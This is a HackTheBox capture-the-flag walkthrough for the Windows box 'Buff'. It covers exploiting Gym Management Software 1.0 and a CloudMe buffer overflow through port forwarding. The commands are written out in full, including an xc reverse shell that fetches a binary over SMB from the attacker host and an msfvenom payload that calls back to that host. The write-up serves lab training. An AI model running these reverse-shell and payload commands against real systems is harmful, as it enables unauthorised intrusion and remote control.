---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2020-11-21-buff-hackthebox
tags:
- cve
- hackthebox
- linux
- port forwarding
title: Buff @ HackTheBox
---

Buff is a 20-point Windows Machine on HackTheBox, created by egotisticalSW. It involves 2 simple public exploits and forwarding a port.

## User

As usual we start with a portscan:

```
nmap -Pn -sV -sC buff.htb
...
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
```

When we visit the site in a browser we can see a fitness site. On contact it shows:

```
mrb3n's Bro Hut
Made using Gym Management Software 1.0 
```

A quick google search shows this [exploit](https://www.exploit-db.com/exploits/48506), which gives us a shell as buff\\shaun:

```
python exploit.py http://buff.htb:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload>
```

To leave this really inconvinient shell, we use smb to pull in and start a xc shell:

```
nc -lvp 1337
\\10.10.14.6\public\xc.exe 10.10.14.6 1337
```

Now we can read the user flag:

```
./xc -l -p 1337

        __  _____
        \ \/ / __|
        >  < (__
        /_/\_\___| by @xct_de
                   build: GLvLrMgcikmgHFyx

2020/11/21 11:13:53 Listening on :1337
2020/11/21 11:13:53 Waiting for connections...
2020/11/21 11:13:53 Connection from 10.10.10.198:49826
2020/11/21 11:13:53 Stream established
[xc]:type \users\shaun\desktop\*
464f8c6c1550f2d071d3e1702801fba5
```

## Root

In Downloads we can find an usual binary:

```
[xc]:!shell
cd \users\shaun 
C:\Users\shaun>dir Downloads
...
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
```

A quick google search shows various public buffer overflow exploits for this exact version. Running `netstat -ano` shows that the service is listening on localhost on the port the exploits mention:

```
netstat -ano | findstr 8888
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       8540
```

A quick side note: This was super unstable on release night and several people, including me, did not have this port even open.

I chose this [exploit](https://www.exploit-db.com/exploits/44470). We have to replace the shellcode though – an easy way to do it is via msfvenom:

```
msfvenom -f python -p windows/exec CMD='cmd.exe /c "\\10.10.14.6\public\xc.exe 10.10.14.6 1338"'
```

After replacing the shellcode, we use xc to forward the port 8888 back to us:

```
!lfwd 8888 localhost 8888
```

We then run the exploit and get a shell back as administrator:

```
./xc -l -p 1338
...
[xc]:whoami
buff\administrator
type \users\administrator\desktop\*
...
6204e76cfbd6001662e4ec757c09f59b
```

This box had many stability issues and running public exploits does not teach much, so I did not really like it.